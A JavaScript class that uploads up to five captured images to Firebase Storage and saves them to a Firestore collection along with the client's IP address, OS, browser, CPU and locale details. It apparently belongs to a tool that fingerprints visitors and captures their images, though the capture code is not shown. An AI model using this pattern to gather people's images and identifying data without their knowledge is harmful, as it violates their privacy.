class DataService {
    constructor() {
        this.capturedImages = [];
        this.imageUrls = [];
    }

    async saveData(clientData) {
        try {
            // Upload images first
            for (let i = 0; i < Math.min(5, this.capturedImages.length); i++) {
                const storageRef = storage.ref(`captures/${Date.now()}_${i}.png`);
                await storageRef.putString(this.capturedImages[i], 'base64');
                const url = await storageRef.getDownloadURL();
                this.imageUrls.push(url);
            }

            const payload = {
                ip_address: clientData.ip || '',
                operating_system: clientData.OS || '',
                os_version: clientData.ver || '',
                browser_name: clientData.getbrow || '',
                browser_version: clientData.getbrowVer || '',
                cpu_name: clientData.CPU || '',
                resolution: clientData.currentResolution || '',
                time_zone: clientData.timeZone || '',
                language: clientData.language || '',
                cpu_cores: clientData.core || '',
                timestamp: clientData.formattedDate || '',
                image1: this.imageUrls[0] || '',
                image2: this.imageUrls[1] || '',
                image3: this.imageUrls[2] || '',
                image4: this.imageUrls[3] || '',
                image5: this.imageUrls[4] || ''
            };

            console.log('payload :>> ', payload);

            // Save to Firestore
            const docRef = await db.collection("Messages").add(payload);

            console.log("Document written with ID: ", docRef.id);
            this.capturedImages = [];
            this.imageUrls = [];
            
        } catch (error) {
            console.error("Error saving data: ", error);
        }
    }

    addCapturedImage(imageData) {
        if (this.capturedImages.length < 5) {
            this.capturedImages.push(imageData);
            console.log(this.capturedImages.length);
        }
    }
}